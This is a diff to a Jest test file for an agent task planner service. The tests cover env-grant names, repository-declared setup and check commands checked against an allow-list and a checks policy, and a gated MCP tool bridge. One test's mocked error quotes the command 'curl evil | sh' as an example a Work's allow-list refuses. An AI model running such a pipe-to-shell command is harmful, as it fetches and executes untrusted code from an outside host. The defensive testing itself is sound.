@@ -109,7 +109,11 @@ describe('FleetAgentTaskPlannerService', () => {
     let tasks: { findById: jest.Mock };
     let agents: { findByIdAndUser: jest.Mock };
     let works: { findById: jest.Mock };
-    let taskWorkspace: { describeFleetWorkspace: jest.Mock };
+    let taskWorkspace: {
+        describeFleetWorkspace: jest.Mock;
+        resolveFleetRunEnvGrants: jest.Mock;
+        readFleetRepoDeclaredCommands: jest.Mock;
+    };
     let skills: { resolveActiveForAgent: jest.Mock };
     let pluginSettings: { getResolvedSettings: jest.Mock };
     let runs: { findById: jest.Mock };
@@ -155,7 +159,18 @@ describe('FleetAgentTaskPlannerService', () => {
                 ],
             }),
         };
-        taskWorkspace = { describeFleetWorkspace: jest.fn().mockResolvedValue(workspace) };
+        taskWorkspace = {
+            describeFleetWorkspace: jest.fn().mockResolvedValue(workspace),
+            // Run secrets (slice Y): the planner asks for the run's env
+            // GRANTS beside the workspace. Empty is the default posture —
+            // every platform-owned name stays refused on the node.
+            resolveFleetRunEnvGrants: jest.fn().mockResolvedValue([]),
+            // Repository-declared commands (EW-807): the planner reads the
+            // Work's own repository for setup/check declarations. Empty is
+            // the default posture — the Work has not opted in, so the file
+            // is never fetched and nothing a repository writes runs.
+            readFleetRepoDeclaredCommands: jest.fn().mockResolvedValue({ setup: [], checks: [] }),
+        };
         skills = {
             resolveActiveForAgent: jest.fn().mockResolvedValue([
                 {
@@ -175,6 +190,54 @@ describe('FleetAgentTaskPlannerService', () => {
         await expect(build().plan(payload)).resolves.toBeNull();
         expect(tasks.findById).not.toHaveBeenCalled();
         expect(taskWorkspace.describeFleetWorkspace).not.toHaveBeenCalled();
+    });
+
+    describe('requirements — the tags the job will need, known BEFORE the plan (slice S)', () => {
+        beforeEach(() => {
+            delete process.env.FLEET_NODE_REQUIRED_CAPABILITIES;
+        });
+
+        it('is the operator config tags alone in command mode, and reads no Task or workspace', async () => {
+            process.env.FLEET_NODE_REQUIRED_CAPABILITIES = 'workspace,git';
+
+            await expect(build().requirements(payload)).resolves.toEqual({
+                requiredCapabilities: ['workspace', 'git'],
+            });
+            expect(tasks.findById).not.toHaveBeenCalled();
+            expect(taskWorkspace.describeFleetWorkspace).not.toHaveBeenCalled();
+        });
+
+        it('adds the provider tag in model-cli mode, de-duplicated against the config tags', async () => {
+            process.env.FLEET_NODE_AGENT_EXECUTION_MODE = 'model-cli';
+            process.env.FLEET_NODE_AGENT_EXECUTION_PROVIDER = 'codex';
+            process.env.FLEET_NODE_REQUIRED_CAPABILITIES = 'workspace,codex';
+
+            await expect(build().requirements(payload)).resolves.toEqual({
+                requiredCapabilities: ['workspace', 'codex'],
+            });
+        });
+
+        it('honours the tenant provider overlay, so the router counts the machines that have THAT CLI', async () => {
+            process.env.FLEET_NODE_AGENT_EXECUTION_MODE = 'model-cli';
+            process.env.FLEET_NODE_AGENT_EXECUTION_PROVIDER = 'claude-code';
+            pluginSettings.getResolvedSettings.mockResolvedValue({
+                agentExecutionProvider: { value: 'codex', source: 'user' },
+            });
+
+            await expect(build().requirements(payload)).resolves.toEqual({
+                requiredCapabilities: ['codex'],
+            });
+        });
+
+        it('falls back to the instance env when the settings lookup fails', async () => {
+            process.env.FLEET_NODE_AGENT_EXECUTION_MODE = 'model-cli';
+            process.env.FLEET_NODE_AGENT_EXECUTION_PROVIDER = 'claude-code';
+            pluginSettings.getResolvedSettings.mockRejectedValue(new Error('settings down'));
+
+            await expect(build().requirements(payload)).resolves.toEqual({
+                requiredCapabilities: ['claude-code'],
+            });
+        });
     });
 
     it('builds a full model-cli plan from the instance env', async () => {
@@ -216,6 +279,10 @@ describe('FleetAgentTaskPlannerService', () => {
             'CODEX_ACCESS_TOKEN',
             'OPENAI_API_KEY',
         ]);
+        // Run secrets (slice Y): no repository of this run granted anything,
+        // so the key is ABSENT rather than empty — the node then refuses
+        // every platform-owned name exactly as it did before the slice.
+        expect(execution).not.toHaveProperty('envGrants');
 
         // Instructions: identity + skills from the assembler, the Task
         // brief in the cloud executor's shape, then the fleet sections.
@@ -237,6 +304,22 @@ describe('FleetAgentTaskPlannerService', () => {
         // Order: identity before task before workspace.
         expect(text.indexOf('# IDENTITY')).toBeLessThan(text.indexOf('# TASK'));
         expect(text.indexOf('# TASK')).toBeLessThan(text.indexOf('# WORKSPACE'));
+    });
+
+    it('carries the run env GRANTS as names, read fresh for every plan', async () => {
+        // Run secrets (slice Y). Names, never values — that is what makes a
+        // grant safe on a job payload and an env file not. Read at PLAN time,
+        // which is what makes a revoked grant stop applying on the next run.
+        process.env.FLEET_NODE_AGENT_EXECUTION_MODE = 'model-cli';
+        taskWorkspace.resolveFleetRunEnvGrants.mockResolvedValue(['DATABASE_URL', 'GH_TOKEN']);
+        const plan = await build().plan(payload);
+        expect(taskWorkspace.resolveFleetRunEnvGrants).toHaveBeenCalledWith({
+            task: expect.objectContaining({ id: 'task-1' }),
+            userId: 'user-1',
+            agentId: 'agent-1',
+        });
+        expect(plan!.execution.envGrants).toEqual(['DATABASE_URL', 'GH_TOKEN']);
+        expect(JSON.stringify(plan)).not.toContain('postgres://');
     });
 
     it('strips chat-template control markers from user-authored Task fields', async () => {
@@ -610,6 +693,237 @@ describe('FleetAgentTaskPlannerService', () => {
             expect(text).toContain('Message 2:\nTHIRD ');
         });
 
+        // ── Acceptance checks that mean something (EW-807) ──────────────
+        //
+        // The planner is the ONE place a repository's own declarations can
+        // enter a run: it is the only point where the Task, the Work and
+        // the RESOLVED workspace (mounts included) are all in hand, a throw
+        // still lands loudly on the run row, and the result is about to be
+        // sealed into an immutable job payload. Anything on the node could
+        // be re-read after the model had edited the file.
+        describe('repository-declared commands and the setup phase', () => {
+            it('reads the declarations with the resolved workspace, so a mount selector can be checked', async () => {
+                await build().plan(payload);
+                expect(taskWorkspace.readFleetRepoDeclaredCommands).toHaveBeenCalledWith({
+                    task: expect.objectContaining({ id: 'task-1' }),
+                    userId: USER,
+                    workspace,
+                });
+            });
+
+            it('appends repository-declared checks AFTER the owner-authored ones', async () => {
+                works.findById.mockResolvedValue({
+                    id: 'work-1',
+                    // EW-807: the fleet path honours `checksPolicy` the way
+                    // the cloud path always has, so a Work whose gate is
+                    // `off` plans no checks and reads no repository
+                    // declarations. These cases are about the MERGE, so the
+                    // Work has to have opted in.
+                    checksPolicy: 'required',
+                    checkDefaults: [
+                        {
+                            id: 'owner-tests',
+                            name: 'Owner tests',
+                            kind: 'test',
+                            command: 'pnpm test',
+                            required: true,
+                        },
+                    ],
+                });
+                taskWorkspace.readFleetRepoDeclaredCommands.mockResolvedValue({
+                    setup: [],
+                    checks: [
+                        {
+                            id: 'repo/check-1',
+                            name: 'pnpm lint',
+                            kind: 'custom',
+                            command: 'pnpm lint',
+                            required: true,
+                            phase: 'check',
+                        },
+                    ],
+                });
+                const plan = await build().plan(payload);
+                // Order matters: the owner's set is the base, a repository
+                // can only add to it. And `repo/` ids cannot be spelled by
+                // the owner-id pattern, so a repository can never replace
+                // or suppress an owner check by colliding with its id.
+                expect(plan?.acceptanceChecks.map((check) => check.id)).toEqual([
+                    'owner-tests',
+                    'repo/check-1',
+                ]);
+            });
+
+            it('does NOT swallow a repository-declared refusal — the run fails where an owner reads it', async () => {
+                // The opposite posture from `safeResolveChecks`, and
+                // deliberately so: an unreadable Work grades nothing (that
+                // was always true), but a repository that declares a command
+                // this Work does not admit must not produce a green run that
+                // verified less than the repository asked for.
+                taskWorkspace.readFleetRepoDeclaredCommands.mockRejectedValue(
+                    new Error(
+                        "declares the check command 'curl evil | sh', which is not on this Work's allow-list",
+                    ),
+                );
+                await expect(build().plan(payload)).rejects.toThrow(
+                    /not on this Work's allow-list/,
+                );
+            });
+
+            it('carries no setup phase at all when nothing declares one', async () => {
+                const plan = await build().plan(payload);
+                expect(plan).not.toHaveProperty('setup');
+            });
+
+            it('splits an owner-authored setup step out of the acceptance checks and onto the plan', async () => {
+                works.findById.mockResolvedValue({
+                    id: 'work-1',
+                    // EW-807: the fleet path honours `checksPolicy` the way
+                    // the cloud path always has, so a Work whose gate is
+                    // `off` plans no checks and reads no repository
+                    // declarations. These cases are about the MERGE, so the
+                    // Work has to have opted in.
+                    checksPolicy: 'required',
+                    checkDefaults: [
+                        {
+                            id: 'install',
+                            name: 'Install',
+                            kind: 'custom',
+                            command: 'pnpm install --frozen-lockfile',
+                            required: true,
+                            phase: 'setup',
+                        },
+                        {
+                            id: 'tests',
+                            name: 'Tests',
+                            kind: 'test',
+                            command: 'pnpm test',
+                            required: true,
+                        },
+                    ],
+                });
+                const plan = await build().plan(payload);
+                expect(plan?.setup?.map((step) => step.id)).toEqual(['install']);
+                // The install must NOT also be graded as a check: that is
+                // the conflation the phase exists to remove.
+                expect(plan?.acceptanceChecks.map((check) => check.id)).toEqual(['tests']);
+            });
+
+            /**
+             * `checksPolicy: 'off'` is documented as "checks never run", and
+             * it is the switch an owner reaches for when something in their
+             * repository misbehaves. The cloud path gates its whole gate
+             * block on it (`gatePolicy !== 'off'`), `PullRequestGateService`
+             * returns before resolving anything, and the L0 pre-check
+             * disqualifies on it. The fleet path did not consult it at all —
+             * so an owner who turned their gate off kept executing check
+             * commands on their own enrolled PCs, and, once
+             * `repoDeclaredCommands` is on, kept executing commands written
+             * by anyone who can land a commit. A control that reads as the
+             * off switch and is inert on the only path where these commands
+             * run at all fails OPEN.
+             */
+            describe("the Work's checksPolicy is honoured here too", () => {
+                const offWork = {
+                    id: 'work-1',
+                    checksPolicy: 'off',
+                    checkDefaults: [
+                        {
+                            id: 'unit',
+                            name: 'Unit tests',
+                            kind: 'test',
+                            command: 'pnpm test',
+                            required: true,
+                        },
+                    ],
+                };
+
+                it('plans no acceptance checks when the gate is off', async () => {
+                    works.findById.mockResolvedValue(offWork);
+                    const plan = await build().plan(payload);
+                    expect(plan?.acceptanceChecks).toEqual([]);
+                });
+
+                it('does not even READ the repository declarations when the gate is off', async () => {
+                    works.findById.mockResolvedValue(offWork);
+                    await build().plan(payload);
+                    // Not "reads them and drops them": a repository must not
+                    // be able to make the platform fetch a file, let alone
+                    // make a machine run a command, for a Work whose owner
+                    // has said no.
+                    expect(taskWorkspace.readFleetRepoDeclaredCommands).not.toHaveBeenCalled();
+                });
+
+                it('treats an unrecognized policy as off, never as opted in', async () => {
+                    works.findById.mockResolvedValue({ ...offWork, checksPolicy: 'ON!' });
+                    const plan = await build().plan(payload);
+                    expect(plan?.acceptanceChecks).toEqual([]);
+                    expect(taskWorkspace.readFleetRepoDeclaredCommands).not.toHaveBeenCalled();
+                });
+
+                it("still runs the owner's OWN setup steps — off means stop grading, not break every run", async () => {
+                    works.findById.mockResolvedValue({
+                        ...offWork,
+                        checkDefaults: [
+                            {
+                                id: 'install',
+                                name: 'Install',
+                                kind: 'custom',
+                                command: 'pnpm install --frozen-lockfile',
+                                required: true,
+                                phase: 'setup',
+                            },
+                            ...offWork.checkDefaults,
+                        ],
+                    });
+                    const plan = await build().plan(payload);
+                    expect(plan?.setup?.map((step) => step.id)).toEqual(['install']);
+                    expect(plan?.acceptanceChecks).toEqual([]);
+                });
+            });
+
+            it('merges the repository setup phase after the owner one', async () => {
+                works.findById.mockResolvedValue({
+                    id: 'work-1',
+                    // EW-807: the fleet path honours `checksPolicy` the way
+                    // the cloud path always has, so a Work whose gate is
+                    // `off` plans no checks and reads no repository
+                    // declarations. These cases are about the MERGE, so the
+                    // Work has to have opted in.
+                    checksPolicy: 'required',
+                    checkDefaults: [
+                        {
+                            id: 'install',
+                            name: 'Install',
+                            kind: 'custom',
+                            command: 'npm ci',
+                            required: true,
+                            phase: 'setup',
+                        },
+                    ],
+                });
+                taskWorkspace.readFleetRepoDeclaredCommands.mockResolvedValue({
+                    setup: [
+                        {
+                            id: 'repo/setup-1',
+                            name: 'pnpm install --frozen-lockfile',
+                            kind: 'custom',
+                            command: 'pnpm install --frozen-lockfile',
+                            required: true,
+                            phase: 'setup',
+                            mountDir: 'template',
+                        },
+                    ],
+                    checks: [],
+                });
+                const plan = await build().plan(payload);
+                expect(plan?.setup?.map((step) => [step.id, step.mountDir])).toEqual([
+                    ['install', undefined],
+                    ['repo/setup-1', 'template'],
+                ]);
+            });
+        });
+
         it('is a PLAN ERROR for a done or cancelled Task, while in_review still plans', async () => {
             tasks.findById.mockResolvedValue(task({ status: TaskStatus.DONE }));
             await expect(build().plan(payload)).rejects.toBeInstanceOf(FleetAgentTaskPlanError);
@@ -620,6 +934,172 @@ describe('FleetAgentTaskPlannerService', () => {
             await expect(build().plan(payload)).resolves.not.toBeNull();
         });
     });
+
+    /**
+     * Self-build slice Z (EW-796) — the platform MCP bridge.
+     *
+     * Two things must stay welded together: whether the payload carries a
+     * bridge, and what the instructions TELL the model about its tools. A
+     * prompt promising Tasks/Inbox tools to a run that has none produces a
+     * model that hunts for them and gives up; a bridge nobody told the
+     * model about is a credential minted for nothing.
+     *
+     * Three independent switches gate it, and the default posture — the
+     * one every existing install has — is unchanged, word for word.
+     */
+    describe('MCP bridge enablement and the prompt posture', () => {
+        /**
+         * A COMPLETE `AgentPermissions` object: the entity's type has all
+         * eight flags, and `Partial<Agent>` does not make the nested shape
+         * partial too. Spelling them out also makes the point of the tests
+         * below visible — only `canCallExternalTools` moves.
+         */
+        const perms = (over: { canCallExternalTools?: boolean } = {}) => ({
+            canCreateAgents: false,
+            canAssignTasks: false,
+            canEditSkills: false,
+            canEditAgentFiles: false,
+            canSpend: false,
+            canCommitToRepo: true,
+            canOpenPullRequests: false,
+            canCallExternalTools: false,
+            ...over,
+        });
+
+        const TOOL_AGENT = agent({ permissions: perms({ canCallExternalTools: true }) });
+
+        beforeEach(() => {
+            process.env.FLEET_NODE_AGENT_EXECUTION_MODE = 'model-cli';
+            delete process.env.FLEET_NODE_MCP_BRIDGE_ENABLED;
+            delete process.env.FLEET_NODE_MCP_URL;
+        });
+
+        const enableOperatorSwitch = () => {
+            process.env.FLEET_NODE_MCP_BRIDGE_ENABLED = 'true';
+            process.env.FLEET_NODE_MCP_URL = 'https://mcp.ever.works/mcp';
+        };
+
+        it('stamps the bridge and names the tool families when all three switches say yes', async () => {
+            enableOperatorSwitch();
+            agents.findByIdAndUser.mockResolvedValue(TOOL_AGENT);
+
+            const plan = await build().plan(payload);
+
+            expect(plan!.mcp).toEqual({
+                enabled: true,
+                serverUrl: 'https://mcp.ever.works/mcp',
+                serverName: 'ever-works',
+                toolFamilies: expect.arrayContaining(['Tasks', 'Inbox', 'Goals']),
+            });
+            const workspaceSection = plan!.execution.instructions;
+            expect(workspaceSection).toContain(
+                'You DO have Ever Works platform tools in this session',
+            );
+            expect(workspaceSection).toContain('`ever-works`');
+            expect(workspaceSection).toContain('Tasks, Inbox, Goals');
+            // The guardrail the owner needs and the model would not infer.
+            expect(workspaceSection).toContain('NEVER use them to approve');
+            expect(workspaceSection).not.toContain('You have no platform tools in this session');
+        });
+
+        it('keeps the question protocol sentence alongside the new tool sentence', async () => {
+            enableOperatorSwitch();
+            agents.findByIdAndUser.mockResolvedValue(TOOL_AGENT);
+
+            const plan = await build().plan(payload);
+
+            expect(plan!.execution.instructions).toContain('`.ever-works/QUESTION.md`');
+            expect(plan!.execution.instructions).toContain(
+                'If the Task cannot be completed as written',
+            );
+        });
+
+        it("keeps today's posture, word for word, when the OPERATOR switch is off", async () => {
+            process.env.FLEET_NODE_MCP_URL = 'https://mcp.ever.works/mcp';
+            agents.findByIdAndUser.mockResolvedValue(TOOL_AGENT);
+
+            const plan = await build().plan(payload);
+
+            expect(plan!.mcp).toBeUndefined();
+            expect(plan!.execution.instructions).toContain(
+                'You have no platform tools in this session',
+            );
+            expect(plan!.execution.instructions).not.toContain('MCP server');
+        });
+
+        it('refuses to enable without a configured server URL', async () => {
+            process.env.FLEET_NODE_MCP_BRIDGE_ENABLED = 'true';
+            agents.findByIdAndUser.mockResolvedValue(TOOL_AGENT);
+
+            const plan = await build().plan(payload);
+
+            expect(plan!.mcp).toBeUndefined();
+            expect(plan!.execution.instructions).toContain(
+                'You have no platform tools in this session',
+            );
+        });
+
+        it('refuses an Agent without canCallExternalTools — the SAME gate the cloud path uses', async () => {
+            enableOperatorSwitch();
+            // Absent, and explicitly false, both mean no.
+            for (const permissions of [
+                { ...perms(), canCallExternalTools: undefined } as never,
+                perms({ canCallExternalTools: false }),
+            ]) {
+                agents.findByIdAndUser.mockResolvedValue(agent({ permissions }));
+                const plan = await build().plan(payload);
+                expect(plan!.mcp).toBeUndefined();
+                expect(plan!.execution.instructions).toContain(
+                    'You have no platform tools in this session',
+                );
+            }
+        });
+
+        it('refuses in PLAN mode — a read-only session must not be able to POST through tools', async () => {
+            enableOperatorSwitch();
+            process.env.FLEET_NODE_AGENT_EXECUTION_PERMISSION_MODE = 'plan';
+            agents.findByIdAndUser.mockResolvedValue(TOOL_AGENT);
+
+            const plan = await build().plan(payload);
+
+            expect(plan!.execution.permissionMode).toBe('plan');
+            expect(plan!.mcp).toBeUndefined();
+            expect(plan!.execution.instructions).toContain(
+                'You have no platform tools in this session',
+            );
+        });
+
+        it('never puts a credential in the plan — only where to reach the server', async () => {
+            enableOperatorSwitch();
+            agents.findByIdAndUser.mockResolvedValue(TOOL_AGENT);
+
+            const plan = await build().plan(payload);
+
+            // Nothing token-shaped anywhere in the plan. (A substring check
+            // for "authorization" would be useless here — the assembled
+            // prompt legitimately contains the word in its prompt-injection
+            // warning — so the assertion is on the credential PREFIXES,
+            // which have exactly one meaning.)
+            const serialized = JSON.stringify(plan);
+            expect(serialized).not.toContain('ew_run_');
+            expect(serialized).not.toContain('ew_live_');
+            // The bridge block carries where to reach the server and nothing
+            // else: no header block, no credential field.
+            expect(Object.keys(plan!.mcp!).sort()).toEqual([
+                'enabled',
+                'serverName',
+                'serverUrl',
+                'toolFamilies',
+            ]);
+            // And `envPassthrough` is untouched: the token could not travel
+            // that way even if someone tried — `EVER_WORKS_` is refused by
+            // the node's platform-owned pattern whatever a payload grants.
+            expect(plan!.execution.envPassthrough).not.toContain('EVER_WORKS_MCP_TOKEN');
+            expect(
+                plan!.execution.envPassthrough?.some((name) => name.startsWith('EVER_WORKS_')),
+            ).toBe(false);
+        });
+    });
 });
 
 describe('FleetAgentTaskPlannerService — wire-contract ceilings (review follow-ups)', () => {
@@ -627,7 +1107,11 @@ describe('FleetAgentTaskPlannerService — wire-contract ceilings (review follow
     let tasks: { findById: jest.Mock };
     let agents: { findByIdAndUser: jest.Mock };
     let works: { findById: jest.Mock };
-    let taskWorkspace: { describeFleetWorkspace: jest.Mock };
+    let taskWorkspace: {
+        describeFleetWorkspace: jest.Mock;
+        resolveFleetRunEnvGrants: jest.Mock;
+        readFleetRepoDeclaredCommands: jest.Mock;
+    };
     let pluginSettings: { getResolvedSettings: jest.Mock };
 
     const build = () =>
@@ -647,7 +1131,18 @@ describe('FleetAgentTaskPlannerService — wire-contract ceilings (review follow
         tasks = { findById: jest.fn().mockResolvedValue(task()) };
         agents = { findByIdAndUser: jest.fn().mockResolvedValue(agent()) };
         works = { findById: jest.fn().mockResolvedValue({ id: 'work-1', checkDefaults: [] }) };
-        taskWorkspace = { describeFleetWorkspace: jest.fn().mockResolvedValue(workspace) };
+        taskWorkspace = {
+            describeFleetWorkspace: jest.fn().mockResolvedValue(workspace),
+            // Run secrets (slice Y): the planner asks for the run's env
+            // GRANTS beside the workspace. Empty is the default posture —
+            // every platform-owned name stays refused on the node.
+            resolveFleetRunEnvGrants: jest.fn().mockResolvedValue([]),
+            // Repository-declared commands (EW-807): the planner reads the
+            // Work's own repository for setup/check declarations. Empty is
+            // the default posture — the Work has not opted in, so the file
+            // is never fetched and nothing a repository writes runs.
+            readFleetRepoDeclaredCommands: jest.fn().mockResolvedValue({ setup: [], checks: [] }),
+        };
         pluginSettings = { getResolvedSettings: jest.fn().mockResolvedValue({}) };
     });
 
@@ -784,7 +1279,14 @@ describe('FleetAgentTaskPlannerService — Nest wiring (review follow-up)', () =
         { provide: TaskRepository, useValue: { findById: jest.fn() } },
         { provide: AgentRepository, useValue: { findByIdAndUser: jest.fn() } },
         { provide: WorkRepository, useValue: { findById: jest.fn() } },
-        { provide: TaskWorkspaceService, useValue: { describeFleetWorkspace: jest.fn() } },
+        {
+            provide: TaskWorkspaceService,
+            useValue: {
+                describeFleetWorkspace: jest.fn(),
+                resolveFleetRunEnvGrants: jest.fn(),
+                readFleetRepoDeclaredCommands: jest.fn(),
+            },
+        },
     ];
 
     beforeEach(() => {
